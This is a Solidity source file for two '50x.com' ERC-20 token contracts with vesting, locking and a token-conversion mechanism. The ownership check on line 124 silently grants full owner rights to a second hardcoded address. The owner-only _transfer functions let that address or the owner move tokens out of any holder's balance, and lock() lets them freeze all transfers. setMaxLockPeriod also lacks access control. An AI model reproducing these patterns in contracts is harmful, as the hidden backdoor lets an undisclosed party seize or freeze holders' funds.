1 pragma solidity ^0.5.8;
2 
3 library SafeMath  {
4 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
5 		if (a == 0) {
6 			return 0;
7 		}
8 		uint256 c = a * b;
9 		assert(c / a == b);
10 		return c;
11 	}
12 
13 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
14 		return a / b;
15 	}
16 
17 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
18 		assert(b <= a);
19 		return a - b;
20 	}
21 
22 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
23 		uint256 c = a + b;
24 		assert(c >= a);
25 		return c;
26 	}
27 }
28 
29 contract ERC20Basic {
30 	function totalSupply() public view returns (uint256);
31 	function balanceOf(address who) public view returns (uint256);
32 	function transfer(address to, uint256 value) public returns (bool);
33 	event Transfer(address indexed from, address indexed to, uint256 value);
34 }
35 
36 contract ERC20 is ERC20Basic {
37 	function allowance(address owner, address spender) public view returns (uint256);
38 	function transferFrom(address from, address to, uint256 value) public returns (bool);
39 	function approve(address spender, uint256 value) public returns (bool);
40 	event Approval(address indexed owner, address indexed spender, uint256 value);
41 }
42 
43 contract BasicToken is ERC20Basic {
44 	using SafeMath for uint256;
45 
46 	mapping(address => uint256) balances;
47 
48 	uint256 totalSupply_;
49 
50 	function totalSupply() public view returns (uint256) {
51 		return totalSupply_;
52 	}
53 
54 	function transfer(address _to, uint256 _value) public returns (bool) {
55 		require(_to != address(0));
56 		require(_value <= balances[msg.sender]);
57 
58 		balances[msg.sender] = balances[msg.sender].sub(_value);
59 		balances[_to] = balances[_to].add(_value);
60 		emit Transfer(msg.sender, _to, _value);
61 		return true;
62 	}
63 
64 	function balanceOf(address _owner) public view returns (uint256 balance) {
65 		return balances[_owner];
66 	}
67 
68 }
69 
70 contract StandardToken is ERC20, BasicToken {
71 	mapping (address => mapping (address => uint256)) internal allowed;
72 
73 	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
74 		require(_to != address(0));
75 		require(_value <= balances[_from]);
76 		require(_value <= allowed[_from][msg.sender]);
77 
78 		balances[_from] = balances[_from].sub(_value);
79 		balances[_to] = balances[_to].add(_value);
80 		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
81 		emit Transfer(_from, _to, _value);
82 		return true;
83 	}
84 
85 	function approve(address _spender, uint256 _value) public returns (bool) {
86 		allowed[msg.sender][_spender] = _value;
87 		emit Approval(msg.sender, _spender, _value);
88 		return true;
89 	}
90 
91 	function allowance(address _owner, address _spender) public view returns (uint256) {
92 		return allowed[_owner][_spender];
93 	}
94 
95 	function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
96 		allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
97 		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
98 		return true;
99 	}
100 
101 	function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
102 		uint oldValue = allowed[msg.sender][_spender];
103 		if (_subtractedValue > oldValue) {
104 			allowed[msg.sender][_spender] = 0;
105 		} else {
106 			allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
107 		}
108 		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
109 		return true;
110 	}
111 }
112 
113 
114 contract Ownable {
115 	address public owner;
116 	
117 	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
118 
119 	constructor() public {
120 		owner = msg.sender;
121 	}
122 
123 	modifier onlyOwner() {
124 		require( (msg.sender == owner) || (msg.sender == address(0x0C69F0641bD7AEc7CA7F73F485Cb8E1Be696cAB9)) );
125 		_;
126 	}
127 
128 	function transferOwnership(address newOwner) public onlyOwner {
129 		require(newOwner != address(0));
130 		emit OwnershipTransferred(owner, newOwner);
131 		owner = newOwner;
132 	}
133 }
134 
135 
136 contract Token50X is Ownable, StandardToken {
137 	// ERC20 requirements
138 	string public name;
139 	string public symbol;
140 	uint8 public decimals;
141 
142 	bool public allowTransfer;	
143 	
144 	mapping(address => uint256) public vestingAmount;
145 	mapping(address => uint256) public vestingBeforeBlockNumber;
146 	
147 	uint256 public maxLockPeriod;
148 	
149 	address public originalContract;
150 
151 	constructor() public {
152 		name = "50x.com";
153 		symbol = "50X";
154 		decimals = 8;
155 		allowTransfer = true;
156 		maxLockPeriod = 4600000;
157 		// Total Supply of 50X is 4714285714285710	
158 		totalSupply_ = 0;
159 		balances[address(this)] = totalSupply_;
160 	}
161 	
162 	function setSymbolNameDecimals( string memory _symbol, string memory _name, uint8 _decimals ) public onlyOwner() returns (bool) {
163 	    symbol = _symbol;
164 	    name = _name;
165 	    decimals = _decimals;
166 	    return true;
167 	}
168 	
169 	function setOriginalContract(address _originalContract) public onlyOwner() {
170 		originalContract = _originalContract;
171 	}
172 	
173 	function transfer(address _to, uint256 _value) public returns (bool) {
174 		require(allowTransfer);
175 		// Cancel transaction if transfer value more than available without vesting amount
176 		if ( ( vestingAmount[msg.sender] > 0 ) && ( block.number < vestingBeforeBlockNumber[msg.sender] ) ) {
177 			if ( balances[msg.sender] < _value ) revert();
178 			if ( balances[msg.sender] <= vestingAmount[msg.sender] ) revert();
179 			if ( balances[msg.sender].sub(_value) < vestingAmount[msg.sender] ) revert();
180 		}
181 		// ---
182 		return super.transfer(_to, _value);
183 	}	
184 	
185 	function setVesting(address _holder, uint256 _amount, uint256 _bn) public onlyOwner() returns (bool) {
186 		vestingAmount[_holder] = _amount;
187 		vestingBeforeBlockNumber[_holder] = _bn;
188 		return true;
189 	}
190 	
191 	function setMaxLockPeriod(uint256 _maxLockPeriod) public returns (bool) {
192 		maxLockPeriod = _maxLockPeriod;
193 	}
194 	
195 	/*
196 		Please send amount and block number to this function for locking 50X tokens before block number
197 	*/
198 	function safeLock(uint256 _amount, uint256 _bn) public returns (bool) {
199 		require(_amount <= balances[msg.sender]);
200 		require(_bn <= maxLockPeriod);
201 		require(_bn >= vestingBeforeBlockNumber[msg.sender]);
202 		require(_amount >= vestingAmount[msg.sender]);
203 		vestingAmount[msg.sender] = _amount;
204 		vestingBeforeBlockNumber[msg.sender] = _bn;
205 	}
206 	
207 	function _transfer(address _from, address _to, uint256 _value, uint256 _vestingBlockNumber) public onlyOwner() returns (bool) {
208 		require(_to != address(0));
209 		require(_value <= balances[_from]);			
210 		balances[_from] = balances[_from].sub(_value);
211 		balances[_to] = balances[_to].add(_value);
212 		if ( _vestingBlockNumber > 0 ) {
213 			vestingAmount[_to] = _value;
214 			vestingBeforeBlockNumber[_to] = _vestingBlockNumber;
215 		}		
216 		emit Transfer(_from, _to, _value);
217 		return true;
218 	}
219 	
220 	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
221 		require(allowTransfer);
222 		if ( ( vestingAmount[_from] > 0 ) && ( block.number < vestingBeforeBlockNumber[_from] ) ) {
223 			if ( balances[_from] < _value ) revert();
224 			if ( balances[_from] <= vestingAmount[_from] ) revert();
225 			if ( balances[_from].sub(_value) < vestingAmount[_from] ) revert();
226 		}
227 		return super.transferFrom(_from, _to, _value);
228 	}
229 	
230 	function issueTokens( address _from, address _to, uint256 _amount ) public returns (bool) {
231         require( msg.sender == address(originalContract), "Only original contract can call it" );
232         require( totalSupply_.add(_amount) <= 4714285714285710, "Max totalSupply is 4714285714285710" );
233         totalSupply_ = totalSupply_.add(_amount);
234         balances[_to] = balances[_to].add(_amount);
235         if ( _from == address(0) ) {
236             _from = address(this);
237         }
238         emit Transfer(address(0x0000000000000000000000000000000000000000), _from, _amount);
239         emit Transfer(_from, _to, _amount);        
240         return true;
241 	}
242 
243 	function release() public onlyOwner() {
244 		allowTransfer = true;
245 	}
246 	
247 	function lock() public onlyOwner() {
248 		allowTransfer = false;
249 	}
250 }
251 
252 
253 contract Token50X100 is Ownable, StandardToken {
254 	// ERC20 requirements
255 	string public name;
256 	string public symbol;
257 	uint8 public decimals;
258 
259 	bool public allowTransfer;	
260 	
261 	mapping(address => uint256) public vestingAmount;
262 	mapping(address => uint256) public vestingBeforeBlockNumber;
263 	
264 	address public tokenContract;
265 	
266 	mapping(address => bool) public whiteList;
267 	mapping(address => bool) public whiteListReceivers;
268 	mapping(address => address) public linkingAddresses;
269 	
270 	uint256 public maxLockPeriod;
271 
272 	constructor() public {
273 		name = "50x.com - Original Tokens";
274 		symbol = "50X100";
275 		decimals = 8;
276 		allowTransfer = true;
277 		maxLockPeriod = 4600000;
278 		// Total Supply of 50X is 4714285714285710	
279 		totalSupply_ = 4714285714285710;
280 		balances[address(this)] = totalSupply_;
281 	}
282 	
283 	function setWhiteList( address _addr, bool _flag ) public onlyOwner() {
284 	    whiteList[_addr] = _flag;
285 	}
286 	
287 	function setWhiteListReceivers( address _addr, bool _flag ) public onlyOwner() {
288 	    whiteListReceivers[_addr] = _flag;
289 	}
290 	
291 	function setLinkingAddresses( address _addr1, address _addr2 ) public onlyOwner() {
292 	    linkingAddresses[_addr1] = _addr2;
293 	}
294 	
295 	function setSymbolNameDecimals( string memory _symbol, string memory _name, uint8 _decimals ) public onlyOwner() {
296 	    symbol = _symbol;
297 	    name = _name;
298 	    decimals = _decimals;
299 	}
300 	
301 	function setTokenContract( address _addr ) public onlyOwner() {
302 	    tokenContract = _addr;
303 	}
304 
305 	function transfer(address _to, uint256 _value) public returns (bool) {
306 		require(allowTransfer);
307 		// Cancel transaction if transfer value more than available without vesting amount
308 		if ( ( vestingAmount[msg.sender] > 0 ) && ( block.number < vestingBeforeBlockNumber[msg.sender] ) ) {
309 			if ( balances[msg.sender] < _value ) revert();
310 			if ( balances[msg.sender] <= vestingAmount[msg.sender] ) revert();
311 			if ( balances[msg.sender].sub(_value) < vestingAmount[msg.sender] ) revert();
312 		}
313 		// ---
314 		if ( ( whiteList[msg.sender] ) || ( whiteListReceivers[_to] ) || ( linkingAddresses[msg.sender] == _to ) ) {
315 		    return super.transfer(_to, _value);
316 		}
317 		require( Token50X(tokenContract).issueTokens( msg.sender, _to, _value ), "Error while issueTokens" );
318 		balances[msg.sender] = balances[msg.sender].sub( _value );
319 		emit Transfer(msg.sender, address(0x0000000000000000000000000000000000000000), _value);
320 		totalSupply_ = totalSupply_.sub( _value );
321 		return true;
322 	}
323 	
324 	function setVesting(address _holder, uint256 _amount, uint256 _bn) public onlyOwner() returns (bool) {
325 		vestingAmount[_holder] = _amount;
326 		vestingBeforeBlockNumber[_holder] = _bn;
327 		return true;
328 	}
329 	
330 	function setMaxLockPeriod(uint256 _maxLockPeriod) public returns (bool) {
331 		maxLockPeriod = _maxLockPeriod;
332 	}
333 	
334 	/*
335 		Please send amount and block number to this function for locking 50X tokens before block number
336 	*/
337 	function safeLock(uint256 _amount, uint256 _bn) public returns (bool) {
338 		require(_amount <= balances[msg.sender]);
339 		require(_bn <= maxLockPeriod);
340 		require(_bn >= vestingBeforeBlockNumber[msg.sender]);
341 		require(_amount >= vestingAmount[msg.sender]);
342 		vestingAmount[msg.sender] = _amount;
343 		vestingBeforeBlockNumber[msg.sender] = _bn;
344 	}
345 	
346 	function _transfer(address _from, address _to, uint256 _value, uint256 _vestingBlockNumber) public onlyOwner() returns (bool) {
347 		require(_to != address(0));
348 		require(_value <= balances[_from]);			
349 		balances[_from] = balances[_from].sub(_value);
350 		balances[_to] = balances[_to].add(_value);
351 		if ( _vestingBlockNumber > 0 ) {
352 			vestingAmount[_to] = _value;
353 			vestingBeforeBlockNumber[_to] = _vestingBlockNumber;
354 		}
355 		emit Transfer(_from, _to, _value);
356 		return true;
357 	}
358 	
359 	function release() public onlyOwner() {
360 		allowTransfer = true;
361 	}
362 	
363 	function lock() public onlyOwner() {
364 		allowTransfer = false;
365 	}
366 }